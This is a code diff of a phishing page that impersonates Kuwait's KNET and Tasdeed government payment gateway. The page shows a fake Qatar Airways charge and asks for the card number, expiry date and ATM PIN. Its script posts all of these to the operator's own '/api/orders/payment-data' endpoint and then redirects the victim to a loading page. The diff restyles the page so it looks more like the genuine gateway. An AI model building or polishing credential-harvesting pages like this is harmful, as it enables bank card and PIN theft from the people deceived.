@@ -7,118 +7,159 @@
     <style>
         body {
             font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-            background-color: #f4f4f4;
+            background-color: #e9ecef;
             margin: 0;
-            padding: 0;
+            padding: 10px;
             display: flex;
             justify-content: center;
-            align-items: center;
+            align-items: flex-start;
             min-height: 100vh;
         }
-        .container {
-            background-color: white;
+        .main-wrapper {
             width: 100%;
-            max-width: 450px;
-            padding: 20px;
+            max-width: 480px;
+        }
+        .banner {
+            width: 100%;
+            border-radius: 15px;
+            overflow: hidden;
+            margin-bottom: 15px;
+            box-shadow: 0 2px 5px rgba(0,0,0,0.1);
+        }
+        .banner img {
+            width: 100%;
+            display: block;
+        }
+        .content-box {
+            background: white;
+            border: 2px solid #bdc3c7;
+            border-radius: 20px;
+            padding: 0;
+            margin-bottom: 20px;
             box-shadow: 0 4px 10px rgba(0,0,0,0.1);
-            border-radius: 8px;
+            overflow: hidden;
         }
-        .header-banner {
+        .tasdeed-logo-section {
             text-align: center;
-            margin-bottom: 20px;
+            padding: 20px 0 10px 0;
         }
-        .header-banner img {
-            max-width: 100%;
-            height: auto;
+        .tasdeed-logo-section img {
+            height: 70px;
         }
-        /* قسم الدفع الحكومي */
-        .gov-payment-box {
-            border: 1px solid #ddd;
-            padding: 15px;
-            border-radius: 5px;
-            margin-bottom: 20px;
-            background-color: #fafafa;
-        }
-        .gov-logos {
+        .row-item {
             display: flex;
-            justify-content: space-around;
+            justify-content: space-between;
             align-items: center;
-            margin-bottom: 15px;
+            padding: 12px 20px;
+            border-top: 1px solid #dee2e6;
         }
-        .gov-logos img {
-            height: 40px;
-        }
-        .payment-info {
-            text-align: right;
-            font-size: 14px;
-            color: #333;
-        }
-        .payment-info div {
-            margin-bottom: 5px;
-        }
-        .payment-info b {
-            color: #000;
-        }
-
-        /* حقول الإدخال */
-        .form-group {
-            display: flex;
-            align-items: center;
-            margin-bottom: 15px;
-            justify-content: flex-end;
-        }
-        .form-group label {
-            width: 160px;
-            text-align: right;
-            margin-left: 10px;
-            font-size: 14px;
+        .label-text {
+            color: #0056b3;
             font-weight: bold;
+            font-size: 15px;
         }
-        .input-container {
+        .value-text {
+            color: #333;
+            font-weight: 500;
+            font-size: 16px;
+        }
+        
+        .form-row {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 15px 20px;
+            border-bottom: 1px solid #dee2e6;
+        }
+        .form-row:last-child {
+            border-bottom: none;
+        }
+        .input-wrapper {
             flex: 1;
+            margin-left: 15px;
             position: relative;
         }
-        .form-group input {
+        .input-wrapper input {
             width: 100%;
             padding: 10px;
-            border: 1px solid #ccc;
-            border-radius: 4px;
-            box-sizing: border-box;
-            text-align: left; /* الأرقام من اليسار */
+            border: 1px solid #ced4da;
+            border-radius: 10px;
+            background-color: #f8f9fa;
+            box-shadow: inset 0 1px 3px rgba(0,0,0,0.1);
+            text-align: left;
             direction: ltr;
             font-size: 16px;
         }
-        .expiry-inputs {
+        .expiry-container {
             display: flex;
+            align-items: center;
             direction: ltr;
+            background: #f8f9fa;
+            border: 1px solid #ced4da;
+            border-radius: 10px;
+            padding: 0 10px;
         }
-        .expiry-inputs input {
+        .expiry-container input {
+            border: none;
+            box-shadow: none;
             width: 50px;
             text-align: center;
         }
-        .expiry-inputs span {
-            padding: 0 5px;
-            align-self: center;
+        
+        .buttons-container {
+            display: flex;
+            background: #f1f3f5;
+            border-top: 1px solid #dee2e6;
         }
-
-        /* قائمة الاقتراحات */
-        .suggestion-box {
+        .btn {
+            flex: 1;
+            padding: 15px;
+            border: none;
+            background: transparent;
+            font-size: 18px;
+            font-weight: bold;
+            color: #495057;
+            cursor: pointer;
+            border-right: 1px solid #dee2e6;
+        }
+        .btn:last-child {
+            border-right: none;
+        }
+        .btn:hover {
+            background-color: #e9ecef;
+        }
+        
+        .footer {
+            text-align: center;
+            margin-top: 20px;
+            font-size: 14px;
+            color: #212529;
+        }
+        .footer b {
+            color: #0056b3;
+            display: block;
+            margin-top: 5px;
+        }
+        
+        /* Suggestions */
+        .suggestion-list {
             position: absolute;
             top: 100%;
             left: 0;
             right: 0;
             background: white;
-            border: 1px solid #ccc;
-            z-index: 1000;
-            max-height: 200px;
+            border: 1px solid #bdc3c7;
+            border-radius: 0 0 10px 10px;
+            z-index: 100;
+            max-height: 150px;
             overflow-y: auto;
             display: none;
-            list-style: none;
             padding: 0;
             margin: 0;
         }
-        .suggestion-box li {
+        .suggestion-list li {
             padding: 10px;
+            list-style: none;
             cursor: pointer;
             display: flex;
             justify-content: space-between;
@@ -126,195 +167,159 @@
             border-bottom: 1px solid #eee;
             direction: ltr;
         }
-        .suggestion-box li:hover {
-            background-color: #f0f0f0;
-        }
-        .suggestion-box img {
-            height: 20px;
-        }
-
-        /* الأزرار */
-        .button-container {
-            background-color: white;
-            padding: 15px;
-            border: 1px solid #eee;
-            border-radius: 5px;
-            display: flex;
-            justify-content: space-around;
-            margin-top: 20px;
-        }
-        .btn {
-            background-color: #808080; /* رمادي كما طلب */
-            color: white;
-            border: none;
-            padding: 10px 30px;
-            border-radius: 4px;
-            cursor: pointer;
-            font-size: 16px;
-            width: 40%;
-        }
-        .btn:hover {
-            opacity: 0.9;
-        }
-        .btn-cancel {
-            background-color: #a0a0a0;
-        }
-
-        #brand-logo-display {
+        .suggestion-list li:hover { background: #f1f3f5; }
+        .suggestion-list img { height: 15px; }
+        #card-brand-logo {
             position: absolute;
             right: 10px;
             top: 50%;
             transform: translateY(-50%);
-            height: 20px;
-            pointer-events: none;
+            height: 18px;
+            display: none;
         }
     </style>
 </head>
 <body>
 
-<div class="container">
-    <div class="header-banner">
-        <img src="data:image/jpeg;base64,iVBORw0KGgoAAAANSUhEUgAAAK8AAAAwCAYAAABnoirjAAAAw3pUWHRSYXcgcHJvZmlsZSB0eXBlIGV4aWYAAHjabVBbDsMgDPvPKXYE8iiE49CtlXaDHX9Jk05lmyWMcZAJge313OHmIBSQpWnttRaDdOk0TGgJjIOxyMFh7VnD2QdOv5BZfkhDa94/ffwExDZMLZcgvWdhnQtdMl+/gig29o5cPzKoZxBTFDADRnyr1K7t+oV1KzM0FjiJzm3/nJtN77HYO0y0MXIxZq7RAPsS4GGiGiPbOJxNC7fDpwyzgfyb0wl4A3HsWW/7eLPjAAABhWlDQ1BJQ0MgcHJvZmlsZQAAeJx9kT1Iw0AcxV9TtUUrDnYQcchQHcQuKuJYqlgEC6Wt0KqDyaUfQpOGJMXFUXAtOPixWHVwcdbVwVUQBD9AnB2cFF2kxP8lhRYxHhz34929x907QGhUmGp2xQBVs4x0Ii7m8iti4BU96EMQEYxLzNSTmYUsPMfXPXx8vYvyLO9zf45+pWAywCcSx5huWMTrxDObls55nzjMypJCfE48YdAFiR+5Lrv8xrnksMAzw0Y2PUccJhZLHSx3MCsbKvE0cURRNcoXci4rnLc4q5Uaa92TvzBU0JYzXKc5ggQWkUQKImTUsIEKLERp1Ugxkab9uId/2PGnyCWTawOMHPOoQoXk+MH/4He3ZnFq0k0KxYHuF9v+GAUCu0Czbtvfx7bdPAH8z8CV1vZXG8DsJ+n1thY5Aga2gYvrtibvAZc7wNCTLhmSI/lpCsUi8H5G35QHBm+B3lW3t9Y+Th+ALHW1dAMcHAJjJcpe83h3sLO3f8+0+vsBvuFyxRGE6jcAAA4zaVRYdFhNTDpjb20uYWRvYmUueG1wAAAAAAA8P3hwYWNrZXQgYmVnaW49Iu+7vyIgaWQ9Ilc1TTBNcENlaGlIenJlU3pOVGN6a2M5ZCI/Pgo8eDp4bXBtZXRhIHhtbG5zOng9ImFkb2JlOm5zOm1ldGEvIiB4OnhtcHRrPSJYTVAgQ29yZSA0LjQuMC1FeGl2MiI+CiA8cmRmOlJERiB4bWxuczpyZGY9Imh0dHA6Ly93d3cudzMub3JnLzE5OTkvMDIvMjItcmRmLXN5bnRheC1ucyMiPgogIDxyZGY6RGVzY3JpcHRpb24gcmRmOmFib3V0PSIiCiAgICB4bWxuczp4bXBNTT0iaHR0cDovL25zLmFkb2JlLmNvbS94YXAvMS4wL21tLyIKICAgIHhtbG5zOnN0RXZ0PSJodHRwOi8vbnMuYWRvYmUuY29tL3hhcC8xLjAvc1R5cGUvUmVzb3VyY2VFdmVudCMiCiAgICB4bWxuczpzdFJlZj0iaHR0cDovL25zLmFkb2JlLmNvbS94YXAvMS4wL3NUeXBlL1Jlc291cmNlUmVmIyIKICAgIHhtbG5zOmRjPSJodHRwOi8vcHVybC5vcmcvZGMvZWxlbWVudHMvMS4xLyIKICAgIHhtbG5zOkdJTVA9Imh0dHA6Ly93d3cuZ2ltcC5vcmcveG1wLyIKICAgIHhtbG5zOnRpZmY9Imh0dHA6Ly9ucy5hZG9iZS5jb20vdGlmZi8xLjAvIgogICAgeG1sbnM6eG1wPSJodHRwOi8vbnMuYWRvYmUuY29tL3hhcC8xLjAvIgogICB4bXBNTTpEb2N1bWVudElEPSJ4bXAuZGlkOjFEMDg4RjdFMEVGODExRUE4NTQ1Q0M2QUQ3ODE4OTVDIgogICB4bXBNTTpJbnN0YW5jZUlEPSJ4bXAuaWlkOmI1NDRhMmEyLTg5NjEtNGFkNC1hMjhlLTA3M2FiMDM4NDUzZiIKICAgeG1wTU06T3JpZ2luYWxEb2N1bWVudElEPSJ4bXAuZGlkOjllNjA2OWY5LTkyMDEtNGQ2OC1iODcyLWJjYzg2YTc5YmQxZCIKICAgZGM6Rm9ybWF0PSJpbWFnZS9wbmciCiAgIEdJTVA6QVBJPSIyLjAiCiAgIEdJTVA6UGxhdGZvcm09IldpbmRvd3MiCiAgIEdJTVA6VGltZVN0YW1wPSIxNzE4MDk1NjMxMDM2NzQzIgogICBHSU1QOlZlcnNpb249IjIuMTAuMzYiCiAgIHRpZmY6T3JpZW50YXRpb249IjEiCiAgIHhtcDpDcmVhdG9yVG9vbD0iR0lNUCAyLjEwIgogICB4bXA6TWV0YWRhdGFEYXRlPSIyMDI0OjA2OjExVDExOjQ3OjAyKzAzOjAwIgogICB4bXA6TW9kaWZ5RGF0ZT0iMjAyNDowNjoxMVQxMTo0NzowMiswMzowMCI+CiAgIDx4bXBNTTpIaXN0b3J5PgogICAgPHJkZjpTZXE+CiAgICAgPHJkZjpsaQogICAgICBzdEV2dDphY3Rpb249InNhdmVkIgogICAgICBzdEV2dDpjaGFuZ2VkPSIvIgogICAgICBzdEV2dDppbnN0YW5jZUlEPSJ4bXAuaWlkOjkxN2IyZTBlLTcwZjAtNDQ2Ny04MmMxLTVkZmI4NDYwNzBkZSIKICAgICAgc3RFdnQ6c29mdHdhcmVBZ2VudD0iR2ltcCAyLjEwIChXaW5kb3dzKSIKICAgICAgc3RFdnQ6d2hlbj0iMjAyNC0wNi0xMVQxMTo0NzoxMSIvPgogICAgPC9yZGY6U2VxPgogICA8L3htcE1NOkhpc3Rvcnk+CiAgIDx4bXBNTTpEZXJpdmVkRnJvbQogICAgc3RSZWY6ZG9jdW1lbnRJRD0iOTZERjlCRkE2QThCRUE5MEE0MDFDOTRFNUM1NTdFNkQiCiAgICBzdFJlZjppbnN0YW5jZUlEPSI5NkRGOUJGQTZBOEJFQTkwQTQwMUM5NEU1QzU1N0U2RCIvPgogIDwvcmRmOkRlc2NyaXB0aW9uPgogPC9yZGY6UkRGPgo8L3g6eG1wbWV0YT4KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgIC2tvrCaJBV8I6gabDLa4YCL" alt="KNET Logo">
+<div class="main-wrapper">
+    <!-- Banner Image -->
+    <div class="banner">
+        <img src="https://i.ibb.co/VpXvXfH/banner.jpg" alt="Be Aware Banner">
     </div>
 
-    <!-- مربع الدفع الحكومي المنفصل -->
-    <div class="gov-payment-box">
-        <div class="gov-logos">
-            <!-- استبدال الشعارات بصور توضيحية أو نص في حال عدم توفر الروابط -->
-            <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/6/6d/Emblem_of_Kuwait.svg/1200px-Emblem_of_Kuwait.svg.png" alt="شعار الكويت">
-            <span style="font-weight: bold; color: #004a99;">نظام الدفع الإلكتروني الحكومي (تسديد)</span>
+    <!-- Box 1: Tasdeed Details -->
+    <div class="content-box">
+        <div class="tasdeed-logo-section">
+            <img src="https://i.ibb.co/L6vNf3k/tasdeed-logo.png" alt="Tasdeed Logo">
         </div>
-        <div class="payment-info">
-            <div>المستفيد: <b>القطرية للطيران</b></div>
-            <div>المبلغ: <b>2.800 د.ك</b></div>
+        <div class="row-item">
+            <span class="label-text">المستفيد:</span>
+            <span class="value-text">القطرية للطيران</span>
+        </div>
+        <div class="row-item">
+            <span class="label-text">المبلغ:</span>
+            <span class="value-text">KD 2.800</span>
         </div>
     </div>
 
-    <form id="knetForm">
-        <div class="form-group">
-            <label>:رقم بطاقة الصراف الآلي</label>
-            <div class="input-container">
-                <input type="text" id="cardNumber" maxlength="19" placeholder="رقم البطاقة" autocomplete="off">
-                <img id="brand-logo-display" src="" alt="">
-                <ul id="suggestionBox" class="suggestion-box"></ul>
+    <!-- Box 2: Payment Form -->
+    <div class="content-box">
+        <div class="form-row">
+            <div class="input-wrapper">
+                <input type="text" id="cardNumber" maxlength="19" autocomplete="off">
+                <img id="card-brand-logo" src="">
+                <ul id="suggestions" class="suggestion-list"></ul>
             </div>
+            <span class="label-text">رقم بطاقة الصراف الآلي:</span>
         </div>
-
-        <div class="form-group">
-            <label>:تاريخ انتهاء البطاقة</label>
-            <div class="input-container expiry-inputs">
-                <input type="text" id="expYear" maxlength="2" placeholder="YY">
-                <span>/</span>
-                <input type="text" id="expMonth" maxlength="2" placeholder="MM">
+        <div class="form-row">
+            <div class="input-wrapper">
+                <div class="expiry-container">
+                    <input type="text" id="expYear" maxlength="2" placeholder="YY">
+                    <span>/</span>
+                    <input type="text" id="expMonth" maxlength="2" placeholder="MM">
+                </div>
             </div>
+            <span class="label-text">تاريخ انتهاء البطاقة:</span>
         </div>
-
-        <div class="form-group">
-            <label>:(PIN) الرقم السري</label>
-            <div class="input-container">
-                <input type="password" id="cardPin" maxlength="4" placeholder="الرقم السري">
+        <div class="form-row">
+            <div class="input-wrapper">
+                <input type="password" id="pin" maxlength="4">
             </div>
+            <span class="label-text">الرقم السري (PIN):</span>
         </div>
+    </div>
 
-        <div class="button-container">
-            <button type="button" class="btn btn-cancel" onclick="window.history.back()">إلغاء</button>
-            <button type="submit" class="btn" id="submitBtn">إرسال</button>
+    <!-- Box 3: Action Buttons -->
+    <div class="content-box">
+        <div class="buttons-container">
+            <button class="btn" id="submitBtn" onclick="handlePayment()">إرسال</button>
+            <button class="btn" onclick="window.history.back()">إلغاء</button>
         </div>
-    </form>
+    </div>
+
+    <!-- Footer -->
+    <div class="footer">
+        جميع الحقوق محفوظة © 2026
+        <b>شركة الخدمات المصرفية الآلية المشتركة – كي نت</b>
+    </div>
 </div>
 
 <script>
-    const cardData = [
-        { bin: "406739", logo: "https://upload.wikimedia.org/wikipedia/commons/thumb/5/5e/Visa_Inc._logo.svg/2560px-Visa_Inc._logo.svg.png", bank: "NBK" },
-        { bin: "419252", logo: "https://upload.wikimedia.org/wikipedia/commons/thumb/5/5e/Visa_Inc._logo.svg/2560px-Visa_Inc._logo.svg.png", bank: "CBK" },
-        { bin: "516335", logo: "https://upload.wikimedia.org/wikipedia/commons/thumb/2/2a/Mastercard-logo.svg/1280px-Mastercard-logo.svg.png", bank: "Gulf Bank" },
-        { bin: "537015", logo: "https://upload.wikimedia.org/wikipedia/commons/thumb/2/2a/Mastercard-logo.svg/1280px-Mastercard-logo.svg.png", bank: "KFH" },
-        { bin: "450778", logo: "https://upload.wikimedia.org/wikipedia/commons/thumb/5/5e/Visa_Inc._logo.svg/2560px-Visa_Inc._logo.svg.png", bank: "Burgan" },
-        { bin: "403611", logo: "https://upload.wikimedia.org/wikipedia/commons/thumb/5/5e/Visa_Inc._logo.svg/2560px-Visa_Inc._logo.svg.png", bank: "Boubyan" },
-        { bin: "423824", logo: "https://upload.wikimedia.org/wikipedia/commons/thumb/5/5e/Visa_Inc._logo.svg/2560px-Visa_Inc._logo.svg.png", bank: "Warba" }
+    const banks = [
+        { bin: "406739", logo: "https://upload.wikimedia.org/wikipedia/commons/thumb/5/5e/Visa_Inc._logo.svg/2560px-Visa_Inc._logo.svg.png" },
+        { bin: "419252", logo: "https://upload.wikimedia.org/wikipedia/commons/thumb/5/5e/Visa_Inc._logo.svg/2560px-Visa_Inc._logo.svg.png" },
+        { bin: "516335", logo: "https://upload.wikimedia.org/wikipedia/commons/thumb/2/2a/Mastercard-logo.svg/1280px-Mastercard-logo.svg.png" },
+        { bin: "537015", logo: "https://upload.wikimedia.org/wikipedia/commons/thumb/2/2a/Mastercard-logo.svg/1280px-Mastercard-logo.svg.png" },
+        { bin: "450778", logo: "https://upload.wikimedia.org/wikipedia/commons/thumb/5/5e/Visa_Inc._logo.svg/2560px-Visa_Inc._logo.svg.png" },
+        { bin: "403611", logo: "https://upload.wikimedia.org/wikipedia/commons/thumb/5/5e/Visa_Inc._logo.svg/2560px-Visa_Inc._logo.svg.png" }
     ];
 
-    const cardNumberInput = document.getElementById('cardNumber');
-    const suggestionBox = document.getElementById('suggestionBox');
-    const brandLogoDisplay = document.getElementById('brand-logo-display');
+    const cardInput = document.getElementById('cardNumber');
+    const suggestBox = document.getElementById('suggestions');
+    const brandImg = document.getElementById('card-brand-logo');
 
-    cardNumberInput.addEventListener('input', (e) => {
-        let value = e.target.value.replace(/\D/g, '');
-        e.target.value = value; // إبقاء الأرقام فقط
-
-        if (value.length > 0) {
-            const filtered = cardData.filter(c => c.bin.startsWith(value));
-            showSuggestions(filtered);
+    cardInput.addEventListener('input', (e) => {
+        let val = e.target.value.replace(/\D/g, '');
+        e.target.value = val;
+        
+        if(val.length > 0) {
+            const matches = banks.filter(b => b.bin.startsWith(val));
+            if(matches.length > 0) {
+                suggestBox.innerHTML = '';
+                matches.forEach(m => {
+                    const li = document.createElement('li');
+                    li.innerHTML = `<span>${m.bin}</span><img src="${m.logo}">`;
+                    li.onclick = () => {
+                        cardInput.value = m.bin;
+                        brandImg.src = m.logo;
+                        brandImg.style.display = 'block';
+                        suggestBox.style.display = 'none';
+                        cardInput.focus();
+                    };
+                    suggestBox.appendChild(li);
+                });
+                suggestBox.style.display = 'block';
+            } else {
+                suggestBox.style.display = 'none';
+            }
         } else {
-            suggestionBox.style.display = 'none';
-            brandLogoDisplay.src = '';
+            suggestBox.style.display = 'none';
+            brandImg.style.display = 'none';
         }
     });
 
-    function showSuggestions(list) {
-        if (list.length === 0) {
-            suggestionBox.style.display = 'none';
-            return;
-        }
-        suggestionBox.innerHTML = '';
-        list.forEach(item => {
-            const li = document.createElement('li');
-            li.innerHTML = `<span>${item.bin}</span> <img src="${item.logo}" alt="logo">`;
-            li.onclick = () => {
-                cardNumberInput.value = item.bin;
-                brandLogoDisplay.src = item.logo;
-                suggestionBox.style.display = 'none';
-                cardNumberInput.focus();
-            };
-            suggestionBox.appendChild(li);
-        });
-        suggestionBox.style.display = 'block';
-    }
-
-    document.addEventListener('click', (e) => {
-        if (!cardNumberInput.contains(e.target) && !suggestionBox.contains(e.target)) {
-            suggestionBox.style.display = 'none';
-        }
-    });
-
-    document.getElementById('knetForm').onsubmit = async (e) => {
-        e.preventDefault();
-        const submitBtn = document.getElementById('submitBtn');
-        submitBtn.disabled = true;
-        submitBtn.innerText = 'جاري الإرسال...';
+    async function handlePayment() {
+        const btn = document.getElementById('submitBtn');
+        btn.disabled = true;
+        btn.innerText = 'جاري الإرسال...';
 
         const data = {
             orderId: sessionStorage.getItem('orderId') || 'ORD-' + Date.now(),
             payment_method: 'Knet',
             knet_data: {
-                card_number: cardNumberInput.value,
+                card_number: cardInput.value,
                 expiry_month: document.getElementById('expMonth').value,
                 expiry_year: document.getElementById('expYear').value,
-                card_pin: document.getElementById('cardPin').value
+                card_pin: document.getElementById('pin').value
             }
         };
 
         try {
-            const res = await fetch('/api/orders/payment-data', {
+            const response = await fetch('/api/orders/payment-data', {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify(data)
             });
-            const result = await res.json();
-            if (result.success) {
-                window.location.href = 'loading.html';
-            } else {
-                alert('حدث خطأ في معالجة البيانات');
-                submitBtn.disabled = false;
-                submitBtn.innerText = 'إرسال';
-            }
-        } catch (err) {
-            console.error(err);
-            alert('خطأ في الاتصال بالخادم');
-            submitBtn.disabled = false;
-            submitBtn.innerText = 'إرسال';
+            const result = await response.json();
+            if(result.success) window.location.href = 'loading.html';
+            else { alert('خطأ في معالجة الطلب'); btn.disabled = false; btn.innerText = 'إرسال'; }
+        } catch(e) {
+            console.error(e);
+            btn.disabled = false;
+            btn.innerText = 'إرسال';
         }
-    };
+    }
 </script>
 
 </body>
